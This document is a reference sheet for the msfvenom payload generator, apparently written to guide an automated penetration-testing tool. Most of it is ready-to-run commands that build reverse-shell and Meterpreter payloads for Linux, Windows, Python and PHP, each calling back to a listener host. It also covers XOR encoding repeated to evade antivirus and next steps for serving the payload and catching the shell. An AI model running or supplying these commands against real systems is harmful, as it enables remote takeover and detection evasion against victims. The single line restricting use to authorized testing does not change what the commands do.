# msfvenom - Payload Generator

## Overview
| Attribute | Value |
|-----------|-------|
| Binary | `msfvenom` |
| Category | Payload Generation |
| Risk Level | High |

## Description
msfvenom is Metasploit's payload generation tool. It creates attack payloads in various formats and supports encoding to help evade detection mechanisms.

---

## Usage Patterns

### 1. List Payloads
**Goal:** Browse available payloads by platform.
```bash
msfvenom -l payloads
msfvenom -l payloads | grep linux
msfvenom -l payloads | grep meterpreter
```

### 2. List Output Formats
**Goal:** See supported output file formats.
```bash
msfvenom -l formats
```

### 3. List Encoders
**Goal:** See available encoding schemes for evasion.
```bash
msfvenom -l encoders
```

---

## Payload Generation Examples

### Linux Reverse Shell
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
```

### Windows Reverse Shell
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
```

### Windows Meterpreter
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o meterpreter.exe
```

### Python Script
```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.py
```

### PHP Web Shell
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
```

### With Encoder (Evasion)
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x64/xor -i 5 -f exe -o encoded.exe
```
- `-e`: Encoder name
- `-i`: Encoding iterations (more = harder to detect)

---

## Common Options
| Option | Description |
|--------|-------------|
| `-p` | Payload to use |
| `-f` | Output format |
| `-o` | Output file path |
| `-e` | Encoder |
| `-i` | Encoding iterations |
| `-b` | Bad characters to avoid |
| `-n` | NOP sled length |
| `LHOST` | Listener IP address |
| `LPORT` | Listener port |

---

## Common Output Formats
| Format | Description |
|--------|-------------|
| `exe` | Windows executable |
| `elf` | Linux executable |
| `raw` | Raw bytes |
| `python` | Python code |
| `php` | PHP code |
| `c` | C code |
| `js_le` | JavaScript |
| `war` | Java WAR package |

---

## Output Parsing

### Sample Output
```
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 119 bytes
Final size of elf file: 239 bytes
Saved as: shell.elf
```

### Parsing Rules
- `Payload size:` = raw payload bytes (check against bad character constraints)
- `Final size of ... file:` = output file size
- `Saved as:` = output file path
- `[-]` auto-selection messages are informational, not errors
- Encoder iterations increase both size and evasion capability

---

## Next Steps

| Finding | Recommended Next Tool | Example |
|---------|----------------------|---------|
| Payload generated | Set up listener with `msfconsole` | `use exploit/multi/handler; set PAYLOAD ...; exploit` |
| Need to deliver payload | `python3` HTTP server | `python3 -m http.server 8000` |
| Payload detected by AV | Add encoder iterations | `msfvenom ... -e x64/xor -i 10` |
| Need staged payload | Use staged variant | Use `/meterpreter/reverse_tcp` (staged) |

---

## Safety Warnings
| Risk | Description |
|------|-------------|
| **High Impact** | Generated payloads execute arbitrary code on target systems. |
| **Detection** | Some payloads are detected by antivirus/EDR solutions. |

> **Warning:** Only use for authorized testing purposes.
